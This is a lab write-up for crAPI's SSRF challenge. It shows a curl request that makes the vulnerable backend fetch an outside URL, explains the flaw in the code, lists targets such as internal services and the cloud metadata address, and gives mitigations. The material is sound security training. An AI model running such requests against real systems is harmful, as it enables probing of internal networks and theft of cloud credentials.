# Challenge 11 — Server Side Request Forgery: Make crAPI call www.google.com

**OWASP API Top 10 mapping:** API7:2023 Server Side Request Forgery  
**crAPI category:** SSRF

## Goal

Force the crAPI backend to make an outbound HTTP request to `www.google.com` and return the response to the attacker.

## Vulnerability

The merchant contact mechanic endpoint (`POST /workshop/api/merchant/contact_mechanic`) accepts a `mechanic_api` URL from the client and performs a server-side `GET` request to it. There is no allow-list or validation of the destination, so the backend can be instructed to fetch any internal or external URL.

## Exploit steps

### 1. Authenticate as any user

```bash
JWT="<your-jwt>"
```

### 2. Ask the backend to fetch www.google.com

```bash
curl -s -X POST \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:8888/workshop/api/merchant/contact_mechanic \
  -d '{"mechanic_api": "http://www.google.com/"}' | python3 -m json.tool
```

### 3. Observe the response

```json
{
  "response_from_mechanic_api": "<!doctype html><html itemscope=\"\" itemtype=\"http://schema.org/WebPage\" lang=\"en\">...<title>Google</title>...</html>",
  "status": 200
}
```

crAPI fetched the Google homepage and returned the HTML in the API response.

## Why this works

- `ContactMechanicView.post` passes `request_data["mechanic_api"]` directly to `requests.get()`.
- The URL is not restricted to an allow-list of mechanic services.
- SSL verification is disabled (`verify=False`), and no host/DNS filtering is applied.

## Impact

- Probe internal infrastructure (e.g., `http://crapi-identity:8080`, `http://169.254.169.254/`).
- Exfiltrate metadata from cloud provider metadata services.
- Pivot into internal APIs that are not exposed externally.
- Combine with the retry feature (Challenge 6) to amplify requests.

## Mitigation

- Maintain an allow-list of approved mechanic endpoint hostnames and reject all others.
- Do not let clients supply raw URLs that the server will call.
- Enforce SSRF-safe request behavior: validate resolved IPs, block private ranges, and restrict URL schemes.
- Place outbound HTTP calls in a sandboxed network segment with no access to internal services.
